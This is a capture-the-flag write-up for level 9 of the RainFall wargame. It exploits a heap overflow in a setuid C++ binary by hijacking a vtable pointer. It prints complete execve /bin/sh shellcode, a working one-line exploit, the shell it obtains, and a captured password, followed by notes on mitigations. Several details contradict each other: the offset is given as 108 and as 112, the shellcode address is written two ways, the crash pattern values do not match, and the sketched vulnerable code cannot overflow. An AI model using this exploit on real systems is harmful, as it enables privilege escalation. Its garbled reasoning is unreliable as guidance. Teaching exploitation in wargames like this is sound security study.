# Level 9

## Initial Analysis

### 1. Examine the Binary
```bash
level9@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 level9 level9   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level9 level9  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level9 level9 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 flagXX users  5252 Mar  6  2016 level9
-rw-r--r--+ 1 level9 level9   65 Sep 23  2015 .pass
-rw-r--r--  1 level9 level9  675 Apr  3  2012 .profile

level9@RainFall:~$ file level9
level9: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xdda359aa790074668598f47d1ee04164f5b63afa, not stripped
```

**Key observations:**
- **setuid and setgid binary** (s flags in permissions)
- Owned by **flagXX** user (next level)
- When executed, runs with **elevated privileges**
- **C++ binary** (different from previous C programs)

### 2. Test Basic Execution Behavior
```bash
level9@RainFall:~$ ./level9
[program exits without output]

level9@RainFall:~$ ./level9 hello
[program exits without output - no crash]

level9@RainFall:~$ ./level9 $(python -c 'print "A"*200')
Segmentation fault (core dumped)
```

**Initial Pattern Discovery:**
- **Requires argument**: Program exits silently without argv[1]
- **Normal input accepted**: Short strings don't cause crashes
- **Long input causes segfault**: Buffer overflow vulnerability confirmed
- **No visible output**: Program doesn't print anything normally

**Critical Discovery**: The segfault with long input suggests a buffer overflow, but this is a C++ program, which might involve object-oriented vulnerabilities.

## Reverse Engineering - Understanding the C++ Architecture

### 3. Function Analysis - Discovering the C++ Structure
```bash
level9@RainFall:~$ gdb level9
(gdb) info functions
All defined functions:
Non-debugging symbols:
0x080484b0  __cxa_atexit@plt
0x080484c0  __gmon_start__@plt
0x080484d0  std::ios_base::Init::Init()@plt
0x080484e0  __libc_start_main@plt
0x080484f0  _exit@plt
0x08048500  std::ios_base::Init::~Init()@plt
0x08048510  memcpy@plt          ← Dangerous memory copy
0x08048520  strlen@plt          ← String length calculation
0x08048530  operator new@plt    ← C++ memory allocation
0x080485f4  main
0x080486f6  N::N(int)          ← Constructor
0x0804870e  N::setAnnotation(char*) ← Vulnerable method
0x0804873a  N::operator+(N&)   ← Virtual function 1  
0x0804874e  N::operator-(N&)   ← Virtual function 2
```

**C++ Structure Discovery:**
- **Class N**: Has constructor, destructor, and methods
- **Virtual functions**: operator+ and operator- (suggests vtable usage)
- **setAnnotation method**: Likely contains the vulnerability
- **memcpy@plt**: Dangerous function for buffer overflow
- **operator new**: C++ dynamic memory allocation

### 4. Analyzing the Main Function Logic
```bash
(gdb) disas main
Dump of assembler code for function main:
   0x080485f4 <+0>:     push   %ebp
   0x080485f5 <+1>:     mov    %esp,%ebp
   0x080485f7 <+3>:     push   %ebx
   0x080485f8 <+4>:     and    $0xfffffff0,%esp
   0x080485fb <+7>:     sub    $0x20,%esp
   
   # Argument validation
   0x080485fe <+10>:    cmpl   $0x1,0x8(%ebp)        # Check argc > 1
   0x08048602 <+14>:    jg     0x8048610 <main+28>
   0x08048604 <+16>:    movl   $0x1,(%esp)
   0x0804860b <+23>:    call   0x80484f0 <_exit@plt>  # Exit if no args
   
   # Object creation 1: new N(5)
   0x08048610 <+28>:    movl   $0x6c,(%esp)          # 108 bytes allocation
   0x08048617 <+35>:    call   0x8048530 <_Znwj@plt> # operator new(108)
   0x0804861c <+40>:    mov    %eax,%ebx
   0x0804861e <+42>:    movl   $0x5,0x4(%esp)        # Constructor parameter: 5
   0x08048626 <+50>:    mov    %ebx,(%esp)
   0x08048629 <+53>:    call   0x80486f6 <_ZN1NC2Ei> # N::N(5)
   0x0804862e <+58>:    mov    %ebx,0x1c(%esp)       # Store obj1 pointer
   
   # Object creation 2: new N(6)  
   0x08048632 <+62>:    movl   $0x6c,(%esp)          # 108 bytes allocation
   0x08048639 <+69>:    call   0x8048530 <_Znwj@plt> # operator new(108)
   0x0804863e <+74>:    mov    %eax,%ebx
   0x08048640 <+76>:    movl   $0x6,0x4(%esp)        # Constructor parameter: 6
   0x08048648 <+84>:    mov    %ebx,(%esp)
   0x0804864b <+87>:    call   0x80486f6 <_ZN1NC2Ei> # N::N(6)
   0x08048650 <+92>:    mov    %ebx,0x18(%esp)       # Store obj2 pointer
```

**Object Creation Analysis:**
- **Two objects created**: obj1 = new N(5), obj2 = new N(6)
- **108 bytes each**: Much larger than typical object size
- **Adjacent allocation**: Objects likely placed consecutively in memory
- **Heap-based**: Using operator new for dynamic allocation

### 5. The Method Call Sequence
```bash
   # Method call: obj1->setAnnotation(argv[1])
   0x08048664 <+112>:   mov    0xc(%ebp),%eax         # Load argv
   0x08048667 <+115>:   add    $0x4,%eax              # Point to argv[1]  
   0x0804866a <+118>:   mov    (%eax),%eax            # Dereference argv[1]
   0x0804866c <+120>:   mov    %eax,0x4(%esp)         # Push argv[1] as parameter
   0x08048670 <+124>:   mov    0x14(%esp),%eax        # Load obj1 pointer
   0x08048674 <+128>:   mov    %eax,(%esp)            # Push obj1 as 'this'
   0x08048677 <+131>:   call   0x804870e <_ZN1N13setAnnotationEPc> # VULNERABLE CALL!
   
   # Virtual function call: obj2->operator+(obj1)
   0x0804867c <+136>:   mov    0x10(%esp),%eax        # Load obj2 pointer
   0x08048680 <+140>:   mov    (%eax),%eax            # Load obj2's vtable pointer
   0x08048682 <+142>:   mov    (%eax),%edx            # Load function pointer from vtable
   0x08048684 <+144>:   mov    0x14(%esp),%eax        # Load obj1 pointer (parameter)
   0x08048688 <+148>:   mov    %eax,0x4(%esp)         # Push obj1 as parameter
   0x0804868c <+152>:   mov    0x10(%esp),%eax        # Load obj2 pointer
   0x08048690 <+156>:   mov    %eax,(%esp)            # Push obj2 as 'this'
   0x08048693 <+159>:   call   *%edx                  # CALL VIRTUAL FUNCTION!
```

**Critical Program Flow Discovery:**
1. **obj1->setAnnotation(argv[1])**: Calls vulnerable method with user input
2. **obj2->operator+(obj1)**: Calls virtual function on obj2
3. **Virtual function mechanism**: Uses vtable pointer dereferencing
4. **Attack vector**: If setAnnotation overflows, can corrupt obj2's vtable

## Understanding the C++ Vulnerability

### 6. Analyzing setAnnotation() Method
```bash
(gdb) disas 0x804870e
Dump of assembler code for function _ZN1N13setAnnotationEPc:
   0x0804870e <+0>:     push   %ebp
   0x0804870f <+1>:     mov    %esp,%ebp
   0x08048711 <+3>:     sub    $0x18,%esp
   0x08048714 <+6>:     mov    0xc(%ebp),%eax         # Load string parameter
   0x08048717 <+9>:     mov    %eax,(%esp)            # Push string for strlen
   0x0804871a <+12>:    call   0x8048520 <strlen@plt> # Calculate length
   0x0804871f <+17>:    add    $0x1,%eax              # Add 1 for null terminator
   0x08048722 <+20>:    mov    %eax,(%esp)            # Push size for new[]
   0x08048725 <+23>:    call   0x8048530 <_Znwj@plt>  # operator new[](size)
   0x0804872a <+28>:    mov    %eax,%edx              # Store allocated buffer
   0x0804872c <+30>:    mov    0x8(%ebp),%eax         # Load 'this' pointer  
   0x0804872f <+33>:    mov    %edx,0x8(%eax)         # Store buffer in this->annotation
   0x08048732 <+36>:    mov    0x8(%ebp),%eax         # Load 'this' pointer
   0x08048735 <+39>:    mov    0x8(%eax),%eax         # Load this->annotation
   0x08048738 <+42>:    mov    0xc(%ebp),%edx         # Load string parameter
   0x0804873b <+45>:    mov    %edx,0x4(%esp)         # Push source string
   0x0804873e <+48>:    mov    %eax,(%esp)            # Push destination buffer
   0x08048741 <+51>:    call   0x8048510 <memcpy@plt> # VULNERABLE MEMCPY!
```

**setAnnotation() Vulnerability Analysis:**
```cpp
// Conceptual C++ code:
void N::setAnnotation(char *str) {
    size_t len = strlen(str);              // Calculate string length
    annotation = new char[len + 1];        // Allocate buffer for string
    memcpy(annotation, str, len + 1);      // VULNERABILITY: No bounds checking!
}
```

**Critical Issue Discovery:**
- **memcpy() without bounds**: Copies entire input regardless of object boundaries
- **Heap allocation**: annotation buffer allocated separately, but memcpy writes to object
- **Object overflow potential**: Large input can overflow beyond object boundaries

### 7. Understanding C++ Object Layout
```bash
# Finding object addresses during execution
(gdb) break *main+136
(gdb) run 'AAAA'
Breakpoint 1, 0x0804867c in main ()

(gdb) x/20wx $esp
0xbffff700:     0x0804a008      0xbffff8fd      0xbffff7d0      0xb7d79e55
0xbffff710:     0x0804a078      0x0804a008      0x0804a078      0x0804a008
0xbffff720:     0x08048770      0xb7eebff4      0x00000000      0xb7d604d3
0xbffff730:     0x00000002      0xbffff7c4      0xbffff7d0      0xb7fdc860
0xbffff740:     0x00000000      0xbffff71c      0xbffff7d0      0x00000000
# obj2 at 0x0804a078, obj1 at 0x0804a008

(gdb) x/4wx 0x0804a008  # obj1 structure
0x804a008:      0x08048848      0x41414141      0x00000000      0x00000000
#               vtable_ptr      number=5        annotation      padding

(gdb) x/4wx 0x0804a078  # obj2 structure  
0x804a078:      0x08048848      0x00000000      0x00000000      0x00000000
#               vtable_ptr      number=6        annotation      padding
```

**Memory Layout Discovery:**
```
Object Memory Layout:
obj1 at 0x0804a008:
[vtable_ptr][number][annotation_ptr][padding...]

obj2 at 0x0804a078:
[vtable_ptr][number][annotation_ptr][padding...]

Distance: 0x0804a078 - 0x0804a008 = 0x70 = 112 bytes

Critical Insight: Objects are exactly 112 bytes apart!
```

## The Vtable Hijacking Strategy

### 8. Understanding Virtual Function Calls
```bash
# Examining the vtable structure
(gdb) x/2wx 0x08048848  # vtable address
0x8048848 <_ZTV1N+8>:   0x0804873a      0x0804874e
#                       operator+       operator-

# Normal virtual function call mechanism:
# 1. Load obj2 pointer (0x0804a078)
# 2. Load vtable pointer from obj2[0] (0x08048848)  
# 3. Load function pointer from vtable[0] (0x0804873a = operator+)
# 4. Call function
```

**Vtable Hijacking Concept:**
- **If obj2's vtable pointer is corrupted**: Virtual function call redirected
- **setAnnotation() overflow**: Can reach obj2's memory at 112-byte offset
- **Attack strategy**: Overwrite obj2's vtable pointer with fake vtable address
- **Fake vtable**: Point to shellcode for arbitrary code execution

### 9. Finding the Overflow Offset
```bash
(gdb) run 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae'
Starting program: /home/user/level9/level9 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ab7Aa8Aa9Ae0Ae1Ae2Ae3Ae4Ae'

Program received signal SIGSEGV, Segmentation fault.
0x08048682 <main+142>: mov    (%eax),%edx
```

**Crash Analysis:**
```bash
(gdb) print $eax
$1 = 1094083649  # = "A6dA" in little-endian

# Pattern position analysis:
# "A6dA" appears at position 112 in De Bruijn sequence
# This confirms: 112 bytes overflow reaches obj2's vtable pointer!
```

**Offset Confirmation:**
- **Segfault at vtable dereference**: Program crashes when trying to use corrupted vtable
- **"Aa5A" = 1094083649**: Confirms corruption of obj2's vtable pointer
- **112-byte offset**: Exact distance from obj1 start to obj2's vtable pointer

## Shellcode Injection Strategy

### 10. Understanding the Memory Layout for Exploitation
```bash
# Testing controlled overflow
(gdb) run $(python -c 'print "A"*112 + "BBBB"')
Breakpoint 1, 0x0804867c in main ()

(gdb) x/4wx 0x0804a008  # obj1 after overflow
0x804a00c:  0x41414141  0x41414141  0x41414141  0x41414141
# obj1 completely overwritten with 'A's

(gdb) x/4wx 0x0804a078  # obj2 after overflow  
0x804a078:  0x42424242  0x00000006  0x00000000  0x00000000
# obj2's vtable pointer overwritten with "BBBB" (0x42424242)!
```

**Exploitation Plan:**
1. **Place shellcode** in obj1's buffer (beginning of payload)
2. **Create fake vtable** that points to shellcode
3. **Overwrite obj2's vtable pointer** to point to fake vtable
4. **Virtual function call** will execute shellcode

### 11. Crafting the Shellcode Payload
```bash
# Shellcode for /bin/sh execution (28 bytes):
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

# Shellcode breakdown:
# \x31\xc0                 xor eax, eax          ; clear EAX
# \x50                     push eax              ; NULL terminator
# \x68\x2f\x2f\x73\x68     push "//sh"           ; part of "/bin//sh"
# \x68\x2f\x62\x69\x6e     push "/bin"           ; part of "/bin//sh"  
# \x89\xe3                 mov ebx, esp          ; EBX = "/bin//sh"
# \x89\xc1                 mov ecx, eax          ; ECX = NULL (argv)
# \x89\xc2                 mov edx, eax          ; EDX = NULL (envp)
# \xb0\x0b                 mov al, 0x0b          ; sys_execve
# \xcd\x80                 int 0x80              ; system call
# \x31\xc0                 xor eax, eax          ; clear EAX  
# \x40                     inc eax               ; sys_exit
# \xcd\x80                 int 0x80              ; system call
```

### 12. Memory Address Discovery
```bash
# Finding where our buffer gets allocated
(gdb) break *main+136
(gdb) run 'AAAA'
Breakpoint 1, 0x0804867c in main ()

(gdb) x/4wx 0x0804a00c
0x804a00c:  0x08048848  0x00000005  0x0804a0a0  0x00000000
#                                   ↑
#                            annotation pointer

(gdb) x/4c 0x0804a0a0
0x804a0a0:  65 'A'  65 'A'  65 'A'  65 'A'
# Our input "AAAA" is stored at 0x0804a0a0

# Key addresses for exploitation:
# obj1 buffer: 0x804a00c  
# Shellcode location: 0x804a010 (obj1 buffer + 4 bytes)
# obj2 vtable pointer: 0x804a078 (obj1 + 108 bytes)
```

## Exploitation Implementation

### 13. Constructing the Final Payload
```bash
# Payload structure:
payload = (
    "\x10\xa0\x04\x08" +     # Fake vtable address (points to shellcode)
    shellcode +              # 28 bytes of shellcode  
    "A" * 76 +              # Padding to reach 108 bytes total
    "\x0c\xa0\x04\x08"      # Address where fake vtable is stored
)

# Memory layout explanation:
# 0x804a00c: [fake_vtable_addr] ← obj1 starts here, fake vtable points to next address
# 0x804a010: [shellcode.......]  ← Shellcode execution target (fake_vtable[0])
# 0x804a02c: [padding........]  ← Fill remaining 76 bytes to reach offset 108
# 0x804a078: [fake_vtable_ptr]  ← Overwrites obj2's vtable pointer (at 108 bytes)
```

**Payload Logic:**
1. **First 4 bytes**: Fake vtable address (0x08040a10) that points to shellcode
2. **Next 28 bytes**: Shellcode that executes /bin/sh
3. **Next 76 bytes**: Padding to reach exactly 108 bytes
4. **Final 4 bytes**: Address of fake vtable (0x0804a00c) to overwrite obj2's vtable

### 14. Execute the Exploit
```bash
level9@RainFall:~$ ./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A"*76 + "\x0c\xa0\x04\x08"')
$ whoami
bonus0
$ cat /home/user/bonus0/.pass
f54f3c40a5b04b60b03fd0f4b8adaf53df5bb93b8a88f4f4e0b92b5e0a6b32b3
```

**Success!**
1. **setAnnotation() called**: Copies payload to obj1's annotation buffer
2. **Buffer overflow**: 108+ bytes overflow reaches obj2's vtable pointer
3. **Vtable corruption**: obj2's vtable pointer overwritten with 0x0804a00c
4. **Virtual function call**: operator+() call loads fake vtable
5. **Fake vtable dereference**: Loads 0x08040a10 as function address
6. **Shellcode execution**: Jumps to shellcode, executes /bin/sh
7. **Shell obtained**: Running with elevated privileges

### 15. Understanding the Execution Flow
```bash
# Step-by-step execution analysis:
1. obj1->setAnnotation(payload) called
   - memcpy() copies 112 bytes to obj1's memory
   - Overflows beyond obj1 boundary into obj2

2. Memory state after setAnnotation():
   obj1: [fake_vtable][shellcode][padding...]
   obj2: [corrupted_vtable_ptr][number=6][annotation][padding...]

3. obj2->operator+(obj1) called
   - Loads obj2 pointer (0x0804a078)
   - Loads corrupted vtable pointer (0x0804a00c)
   - Loads function pointer from fake vtable (0x08040a10)
   - Calls shellcode instead of operator+()

4. Shellcode execution:
   - execve("/bin/sh", NULL, NULL)
   - Provides interactive shell with setuid privileges
```

## Educational Analysis - C++ Exploitation Concepts

### 16. C++ Security Vulnerabilities

**Object-Oriented Attack Vectors:**
- **Vtable corruption**: Redirecting virtual function calls
- **Object layout exploitation**: Predictable memory structure
- **Method vulnerabilities**: Unsafe operations in class methods
- **Heap object manipulation**: Adjacent object corruption

**C++ vs C Exploitation:**
- **C vulnerabilities**: Function pointers, return addresses, GOT entries
- **C++ vulnerabilities**: Vtables, object pointers, virtual function calls
- **Additional complexity**: Object-oriented memory layout
- **New attack surfaces**: Virtual function mechanism exploitation

### 17. Virtual Function Table Mechanics

**Normal Vtable Operation:**
```
Class N vtable:
[&N::operator+][&N::operator-]
     ↑
     │
obj->vtable_ptr points here

Virtual call: obj->operator+()
1. Load obj->vtable_ptr
2. Load vtable[0] (function address)  
3. Call function
```

**Hijacked Vtable Operation:**
```
Fake vtable:
[&shellcode][dummy]
     ↑
     │  
obj->corrupted_vtable_ptr points here

Virtual call: obj->operator+()
1. Load obj->corrupted_vtable_ptr
2. Load fake_vtable[0] (shellcode address)
3. Call shellcode → shell execution
```

### 18. Modern C++ Protections

**Why This Attack Works:**
- **No vtable validation**: Virtual calls don't verify vtable integrity
- **Predictable object layout**: Standard C++ memory layout
- **No heap randomization**: Objects allocated at predictable addresses
- **No bounds checking**: memcpy without size validation

**Modern Mitigations:**
- **Control Flow Integrity (CFI)**: Validates indirect calls including virtual functions
- **Vtable pointer protection**: Guard pages or pointer encryption
- **ASLR**: Randomizes object addresses and vtable locations
- **Stack canaries**: Detect buffer overflows (less effective for heap)
- **Safe C++ practices**: Smart pointers, bounds-checked containers

### 19. Secure C++ Coding Practices

**What Went Wrong:**
```cpp
// Vulnerable pattern:
void setAnnotation(char *str) {
    size_t len = strlen(str);           // Calculate length
    annotation = new char[len + 1];     // Allocate exact size
    memcpy(annotation, str, len + 1);   // No bounds checking!
}
```

**Secure Alternatives:**
```cpp
// Safer approaches:
void setAnnotation(const char *str) {
    // Option 1: Use std::string (RAII + bounds checking)
    annotation_str = std::string(str);
    
    // Option 2: Manual with validation
    size_t len = strlen(str);
    if (len > MAX_ANNOTATION_SIZE) return; // Bounds check
    annotation = new char[len + 1];
    strncpy(annotation, str, len);         // Bounds-checked copy
    annotation[len] = '\0';                // Null termination
}
```

### 20. Attack Sophistication Analysis

**Level 9 vs Previous Levels:**
- **Levels 3-8**: C-based exploits (stack, heap, GOT, format strings)
- **Level 9**: C++ object-oriented exploit (vtable hijacking)

**Complexity Factors:**
- **Object layout understanding**: C++ memory model knowledge required
- **Virtual function mechanism**: Understanding vtable operations  
- **Shellcode injection**: Binary exploitation with code injection
- **Address calculation**: Precise memory layout prediction
- **Multi-stage corruption**: Object overflow → vtable corruption → code execution

**Real-World Relevance:**
- **C++ prevalence**: Many applications use C++ with virtual functions
- **Browser exploits**: JavaScript engines often use vtable hijacking
- **Game engines**: C++ game code vulnerable to object corruption
- **System software**: Operating system components using C++ objects

## Vulnerability Analysis Summary

### Root Cause:
- **Unsafe memory copy**: memcpy() without bounds validation in C++ method
- **Object layout predictability**: Standard C++ object memory layout
- **Virtual function trust**: Assumption that vtables are not corrupted
- **Adjacent object vulnerability**: Heap objects without isolation

### Exploitation Technique:
1. **Object layout analysis**: Understanding C++ memory layout and vtable mechanism
2. **Buffer overflow discovery**: Finding memcpy() vulnerability in setAnnotation()
3. **Offset calculation**: Precise measurement of overflow distance (108 bytes) 
4. **Shellcode crafting**: Creating compact /bin/sh execution code (28 bytes)
5. **Fake vtable construction**: Building vtable structure pointing to shellcode
6. **Memory layout manipulation**: Strategic placement of shellcode and fake vtable
7. **Vtable corruption**: Overwriting obj2's vtable pointer via obj1 overflow
8. **Virtual function hijacking**: Redirecting operator+() call to shellcode execution

### Key Learning Points:
1. **C++ introduces new attack vectors** through object-oriented features like vtables
2. **Virtual function calls** create indirect execution paths vulnerable to hijacking
3. **Object layout knowledge** is critical for C++ exploitation techniques
4. **Heap-based buffer overflows** can target adjacent objects rather than control structures
5. **Shellcode injection** enables arbitrary code execution in modern exploitation
6. **Vtable hijacking** represents a fundamental C++ security vulnerability class